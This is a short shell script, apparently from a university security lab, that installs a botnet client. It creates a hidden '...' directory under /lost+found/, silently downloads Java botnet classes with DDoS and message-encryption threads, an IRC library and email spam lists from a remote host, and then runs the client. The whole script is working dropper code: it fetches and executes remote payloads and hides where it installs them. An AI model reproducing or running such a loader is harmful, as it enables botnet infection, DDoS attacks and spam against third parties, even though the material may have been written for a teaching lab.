###########################################
#! /bin/sh                                                                                  

if [ -z "$DIR" ]; then
    dhclient &> /dev/null

    DIR='/lost+found/'
    FOLDER='...'
    TARGET='BotnetClient'
    SRC="${TARGET}.java"
    BIN="${TARGET}.class"
    BIN2="BotnetClient\$DdosThread.class"
    BIN3="BotnetClient\$ProcessErrorThread.class"
    BIN4="BotnetClient\$ProcessInputThread.class"
    BIN5="MsgEncrypt.class"
    PIRC="pircbot.jar"
    APAC="commons-codec-1.4.jar"
    TEMPLATE="template.txt"
    EMAILS="emails.txt"
    RAND_EMAILS="random_emails.txt"
    CLEAN="clean.sh"
    INFO="PubInfo.class"
    CURDIR=`pwd`

    if [ ! -d "${DIR}${FOLDER}" ]; then
        mkdir "${DIR}${FOLDER}"
    else
        rm -r "${DIR}${FOLDER}"
        mkdir "${DIR}${FOLDER}"
    fi
    cd "${DIR}${FOLDER}"

    wget "abstract.cs.washington.edu/~roy/lab3/Botnet/bin/$BIN2" &> /dev/null
    wget "abstract.cs.washington.edu/~roy/lab3/Botnet/bin/$BIN3" &> /dev/null
    wget "abstract.cs.washington.edu/~roy/lab3/Botnet/bin/$BIN4" &> /dev/null
    wget "abstract.cs.washington.edu/~roy/lab3/Botnet/bin/$BIN5" &> /dev/null
    wget "abstract.cs.washington.edu/~roy/lab3/Botnet/$PIRC" &> /dev/null
    wget "abstract.cs.washington.edu/~roy/lab3/Botnet/bin/$BIN" &> /dev/null
    wget "abstract.cs.washington.edu/~roy/lab3/Botnet/$APAC" &> /dev/null    
    wget "abstract.cs.washington.edu/~roy/lab3/Botnet/$TEMPLATE" &> /dev/null
    wget "abstract.cs.washington.edu/~roy/lab3/Botnet/$EMAILS" &> /dev/null
    wget "abstract.cs.washington.edu/~roy/lab3/Botnet/$INFO" &> /dev/null
    #wget "abstract.cs.washington.edu/~roy/lab3/Botnet/$CLEAN" &> /dev/null
    
    cp $EMAILS $RAND_EMAILS

    java -classpath "${PIRC}:${APAC}:." $TARGET #&> /dev/null &
    
    cd $CURDIR
fi
###########################################